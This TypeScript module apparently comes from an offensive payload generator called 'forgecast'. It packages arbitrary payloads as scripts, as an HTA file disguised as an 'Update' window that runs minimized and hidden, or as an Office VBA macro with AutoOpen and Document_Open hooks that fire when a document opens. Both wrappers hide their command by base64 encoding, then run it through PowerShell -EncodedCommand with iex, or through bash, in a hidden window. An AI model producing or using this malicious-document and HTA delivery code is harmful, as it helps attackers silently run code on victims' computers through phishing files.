import type { Language } from "@/lib/payloads/templates";

export type OutputFormat = "raw" | "script" | "hta" | "vba";

export interface OutputFormatOption {
  id: OutputFormat;
  label: string;
  ext: string;
  description: string;
}

export const OUTPUT_FORMATS: OutputFormatOption[] = [
  { id: "raw", label: "raw", ext: "txt", description: "payload as is" },
  { id: "script", label: "script", ext: "sh", description: "standalone script with shebang" },
  { id: "hta", label: "hta", ext: "hta", description: "HTML Application for Windows double click" },
  { id: "vba", label: "vba", ext: "vba", description: "Office VBA macro via Shell()" },
];

function toB64(text: string): string {
  if (typeof btoa !== "undefined") return btoa(unescape(encodeURIComponent(text)));
  return Buffer.from(text, "utf-8").toString("base64");
}

function scriptShebang(lang: Language, payload: string): string {
  const stamp = new Date().toISOString().slice(0, 10);
  switch (lang) {
    case "bash":
      return `#!/usr/bin/env bash\n# forgecast payload (${stamp})\n# authorized use only\n${payload}`;
    case "sh":
      return `#!/bin/sh\n# forgecast payload (${stamp})\n${payload}`;
    case "python":
      return `#!/usr/bin/env python3\n# forgecast payload (${stamp})\n${payload}`;
    case "ruby":
      return `#!/usr/bin/env ruby\n# forgecast payload (${stamp})\n${payload}`;
    case "perl":
      return `#!/usr/bin/env perl\n# forgecast payload (${stamp})\n${payload}`;
    case "php":
      return `<?php\n// forgecast payload (${stamp})\n${payload}\n?>`;
    case "node":
      return `#!/usr/bin/env node\n// forgecast payload (${stamp})\n${payload}`;
    case "powershell":
      return `# forgecast payload (${stamp})\n# authorized use only\n${payload}`;
    case "netcat":
    case "telnet":
    case "awk":
    case "lua":
    case "java":
    case "groovy":
    case "csharp":
    case "c":
    case "go":
      return `// forgecast payload (${stamp})\n${payload}`;
    default:
      return payload;
  }
}

function htaWrap(payload: string, lang: Language): string {
  let cmd: string;
  if (lang === "powershell") {
    const b64 = toB64(`$s=${JSON.stringify(payload)};iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))`);
    cmd = `powershell -EncodedCommand ${b64} -WindowStyle Hidden`;
  } else if (lang === "python") {
    cmd = `python -c ${JSON.stringify(payload.replace(/\n/g, " "))}`;
  } else {
    const b64 = toB64(payload);
    cmd = `bash -c "$(echo ${b64} | base64 -d)"`;
  }
  return `<html>
<head>
  <meta charset="utf-8">
  <title>Update</title>
  <hta:application
    id="oApp"
    applicationname="Update"
    border="none"
    caption="no"
    showintaskbar="no"
    windowstate="minimize">
</head>
<body>
<script language="VBScript">
  Set sh = CreateObject("WScript.Shell")
  sh.Run "cmd /c ${cmd.replace(/"/g, '""')}", 0, False
  window.close()
</script>
</body>
</html>`;
}

function vbaWrap(payload: string, lang: Language): string {
  let cmd: string;
  if (lang === "powershell") {
    const b64 = toB64(`$s=${JSON.stringify(payload)};iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))`);
    cmd = `powershell -EncodedCommand ${b64} -WindowStyle Hidden`;
  } else if (lang === "python") {
    cmd = `python -c ${JSON.stringify(payload.replace(/\n/g, " "))}`;
  } else {
    const b64 = toB64(payload);
    cmd = `bash -c "$(echo ${b64} | base64 -d)"`;
  }
  const escaped = cmd.replace(/"/g, '""');
  return `' forgecast payload (VBA macro)
' Paste into Word/Excel VBA editor (Alt+F11), then run Forgecast()
' Requires macro enabled document (.docm / .xlsm)

Sub AutoOpen()
  Forgecast
End Sub

Sub Auto_Open()
  Forgecast
End Sub

Sub Document_Open()
  Forgecast
End Sub

Sub Forgecast()
  Dim sh As Object
  Set sh = CreateObject("WScript.Shell")
  sh.Run "cmd /c ${escaped}", 0, False
End Sub`;
}

export function wrapOutput(payload: string, format: OutputFormat, lang: Language): string {
  if (!payload) return "";
  switch (format) {
    case "raw":
      return payload;
    case "script":
      return scriptShebang(lang, payload);
    case "hta":
      return htaWrap(payload, lang);
    case "vba":
      return vbaWrap(payload, lang);
    default:
      return payload;
  }
}

export function extFor(format: OutputFormat, lang: Language): string {
  if (format === "hta") return "hta";
  if (format === "vba") return "vba";
  if (format === "raw") {
    if (lang === "powershell") return "ps1";
    if (lang === "python") return "py";
    if (lang === "ruby") return "rb";
    if (lang === "perl") return "pl";
    if (lang === "php") return "php";
    if (lang === "node") return "js";
    if (lang === "java") return "java";
    if (lang === "csharp") return "cs";
    if (lang === "c") return "c";
    if (lang === "go") return "go";
    if (lang === "bash" || lang === "sh") return "sh";
    return "txt";
  }
  return extFor("raw", lang);
}
